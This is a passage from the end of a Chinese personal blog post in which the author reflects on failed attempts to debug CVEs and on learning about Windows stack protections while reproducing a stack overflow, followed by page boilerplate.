+<h6 id="近人可读"><a href="#近人可读" class="headerlink" title="近人可读"></a><font color ='pink'>近人可读</font></h6><p>前段时间, 我试着去调试了一些CVE, 最终自然是铩羽而归, 但是也积累了一些也许未来能够用到的东西, 至少是了解了windows相关的一些东西. </p>
+<p>复现这个栈溢出漏洞的过程中, 我也遇到了许多麻烦, 比如我第一次进行提权利用时, 我忘记了要维持栈平衡, 把原因归结为也许是堆栈不可执行, 但是我又对GS, DEP, SEH等概念十分模糊, 自然而然是基础过于薄弱, 于是去翻读了一下”0day2”, 还好自己人菜瘾大, 及时的补上了相关的知识</p>
+</div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206104441.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/12/06/A%20TALE%20OF%20HEVD/"><img class="prev-cover" src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206104441.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">A TALE OF HEVD</div></div></a></div><div class="next-post pull-right"><a href="/2020/10/06/10.6%E6%97%A5%E8%AE%B0/"><img class="next-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">一些琐事</div></div></a></div></nav></article></main><footer id="footer" style="background-image: url(https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206104441.png)"><div id="footer-wrap"><div class="copyright">&copy;2020 By yo-lee</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
